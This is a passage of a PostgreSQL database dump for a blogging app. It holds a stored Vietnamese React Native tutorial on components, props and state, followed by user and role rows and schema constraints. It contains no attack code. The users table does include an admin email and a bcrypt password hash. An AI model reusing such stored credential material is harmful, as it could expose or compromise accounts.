ảnh thumbnail của ca sĩ và ảnh bìa của album cùng một nút bấm mua. Chúng ta có thể hình dung ra rằng List đó sẽ là một Scroll view và các item trong đó là biểu thị cho một album. Đây có thể là một cách chia các component cho ví dụ này.\n\n![](https://images.viblo.asia/1f488982-3c8a-48b9-ad9a-2cb950096a25.png)\n\nNgoài những component chúng ta xây dựng và sử dụng lại đó, thì Reat native sẵn có đó là một tá các component mặc định rồi.\n\n### Props\nProps là viết tắt của Properties. Một điều mà bạn cần phải nhớ khi sử dụng props đó là không bao giờ nên thay đổi giá trị của nó, hay nói cách khác, đây là một dữ liệu immutable.\n\nCác component nhận props từ component cha. Bạn không được thay đổi giá trị của props trong các component này mà chỉ được phép đọc giá trị ra thôi. Trong React thì dữ liệu sẽ đi theo một chiều, có nghĩa là từ component cha => các component con.\n\nĐây là một ví dụ mình sử dụng props, cung cấp cho một component tên là Header.\n```\nexport default class App extends Component<Props> {\n  render() {\n    return (\n      <View style  = {{flex: 1}}>\n        <Header title = 'This is header' ></Header>\n        <AlbumList></AlbumList>\n      </View>\n    );\n  }\n}\n```\n\nTrong component Header mình sẽ sử dụng props `title` này để render ra tiêu đề của nó.\n```\nexport default class Header extends Component {\n    render () {\n        return (\n            <View style = { styles.headerView }>\n                <Text style = { styles.headerTitle }> { this.props.title } </Text>\n            </View>\n        );\n    }\n}\n```\n\n### State\nState thì hoạt động khác với Props.  State là dữ liệu nội bộ của một Component, trong khi props là dữ liệu được truyền cho Component. Chính vì vậy chúng ta hoàn toàn có thể thay đổi state, và coi nó là một kiểu dữ liệu mutable. Vì đặc điểm này nên chúng ta hay sử dụng State để thay đổi dữ liệu của view, binding data lại view khi có thay đổi.\nNhưng chúng ta không dùng `this.state` để gán lại giá trị thay đổi cho nó, mà chúng ta sẽ dùng `this.setState`. Function này sẽ trigger cho class rằng hãy render lại component và các component con của nó, còn `this.state` thì không.\n\nĐây là một ví dụ về sự dụng `state` để thay đổi giá trị. Giống như việc bạn truyền datasource cho tableview vậy, ban đầu datasource chính là `state` này rỗng và sau đó được trả về dự liệu sau khi call api. Và từ đó thay đổi `state` sẽ làm cho component render lại dữ liệu (tương tự reloadData() thôi).\n\n```\nexport default class AlbumList extends Component {\n    state = { albums: [] }\n\n    componentWillMount() {\n        axios.get('https://rallycoding.herokuapp.com/api/music_albums')\n            .then(response => {\n                this.setState({ albums: response.data })\n            });\n    }\n\n    renderAlbums() {\n        console.log(this.state.albums);\n        return this.state.albums.map( album => \n            <AlbumDetail key = {album.title} album = {album} />\n        );\n    }\n\n    render () {\n        return (\n            <ScrollView> \n                { this.renderAlbums() }\n            </ScrollView>\n        );\n    }\n}\n```\n\nCòn đây là hình ảnh consoleLog ở trên debuger, chúng ta có thể thấy rõ ràng lúc đầu `state.albums` vẫn còn rỗng và sau đó khi call api, và có data trả về, nhờ vào việc `setState` lại view có thể render và hiển thị ra ngoài.\n\n![](https://images.viblo.asia/158bae2f-c970-461e-8a8a-219decb424c5.png)\n\nTrên đây là tổng quan một số khái niệm chúng ta cần tìm hiểu khi đọc về React native, rất mong bài viết có thể giúp đỡ các bạn ít nhiều.\n\n## References:\nhttps://facebook.github.io/react-native/docs/getting-started\n\nhttps://techtalk.vn/tong-quan-ve-react-native.html	![](https://images.viblo.asia/8b8cedae-45ce-4558-b562-7692bd5cd675.png)\n\n\n\nReact native là một công cụ giúp chúng ta lập trình đa nền tảng để tạo ra các ứng dụng trên môi trường native. Nó là một framework mã nguồn mở được phát triển bởi Facebook, cho phép bạn sử dụng Java script để phát triển phần mềm trên điện thoại di động Android và IOS. React native cũng giống như React vậy chúng sử dụng các native components thay vì các web components. Vì vậy để hiểu về cấu tr...	{https://images.viblo.asia/8b8cedae-45ce-4558-b562-7692bd5cd675.png,https://images.viblo.asia/63416380-42fa-4467-94ba-c2421bd4275a.jpg,https://images.viblo.asia/0a1593ab-af82-4bfa-8f2d-4a3ca1b46b9f.png,https://images.viblo.asia/fc03a067-ca8b-41cc-aa4d-714bdaaa63a0.png,https://images.viblo.asia/1f488982-3c8a-48b9-ad9a-2cb950096a25.png,https://images.viblo.asia/158bae2f-c970-461e-8a8a-219decb424c5.png}	1	React native - Những khái niệm cơ bản cần biết khi bắt đầu	{reactnative}	0	f	2022-12-18 15:33:38.546+00	2022-12-18 15:33:38.546+00
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users (id, username, email, password, first_name, last_name, avatar, bio, "isActivate", "isPremium", "createdAt", "updatedAt") FROM stdin;
1	admin	admin@gmail.com	$2a$08$0Em9JENz5FktS/8bFxgrjuKAZqGqMvVH.TRw0Zpnu8yQRBIgYnLle	ad	min	\N	i am min ad	t	f	2022-12-18 15:33:07.444+00	2022-12-18 15:33:07.444+00
\.


--
-- Data for Name: users_roles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users_roles ("createdAt", "updatedAt", "roleId", "userId") FROM stdin;
2022-12-18 15:33:07.468+00	2022-12-18 15:33:07.468+00	1	1
\.


--
-- Name: drafts_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.drafts_id_seq', 1, false);


--
-- Name: stories_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.stories_id_seq', 1, false);


--
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.users_id_seq', 1, true);


--
-- Name: comments comments_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.comments
    ADD CONSTRAINT comments_pkey PRIMARY KEY (comment_id);


--
-- Name: drafts drafts_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.drafts
    ADD CONSTRAINT drafts_pkey PRIMARY KEY (id);


--
-- Name: reactions reactions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.reactions
    ADD CONSTRAINT reactions_pkey PRIMARY KEY (user_id, story_id);


--
-- Name: roles roles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.roles
    ADD CONSTRAINT roles_pkey PRIMARY KEY (id);


--
-- Name: stories stories_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.stories
    ADD CONSTRAINT stories_pkey PRIMARY KEY (id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: users_roles users_roles_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users_roles
    ADD CONSTRAINT users_roles_pkey PRIMARY KEY ("roleId", "userId");


--
-- Name: comments comments_story_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.comments
    ADD CONSTRAINT comments_story_id_fkey FOREIGN KEY (story_id) REFERENCES public.stories(id) ON UPDATE CASCADE;


--
-- Name: comments comments_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.comments
    ADD CONSTRAINT comments_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id) ON UPDATE CASCADE;


--
-- Name: drafts drafts_author_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.drafts
    ADD CONSTRAINT drafts_author_id_fkey FOREIGN KEY (author_id) REFERENCES public.users(id) ON UPDATE CASCADE;


--
-- Name: reactions reactions_story_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.reactions
    ADD CONSTRAINT reactions_story_id_fkey FOREIGN KEY (story_id) REFERENCES public.stories(id) ON UPDATE CASCADE;


--
-- Name: reactions reactions_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.reactions
    ADD CONSTRAINT reactions_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id) ON UPDATE CASCADE;


--
-- Name: stories stories_author_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.stories
    ADD CONSTRAINT stories_author_id_fkey FOREIGN KEY (author_id) REFERENCES public.users(id) ON UPDATE CASCADE;


--
-- Name: users_roles users_roles_roleId_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users_roles
    ADD CONSTRAINT "users_roles_roleId_fkey" FOREIGN KEY ("roleId") REFERENCES public.roles(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- Name: users_roles users_roles_userId_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users_roles
    ADD CONSTRAINT "users_roles_userId_fkey" FOREIGN KEY ("userId") REFERENCES public.users(id) ON UPDATE CASCADE ON DELETE CASCADE;


--
-- PostgreSQL database dump complete
--

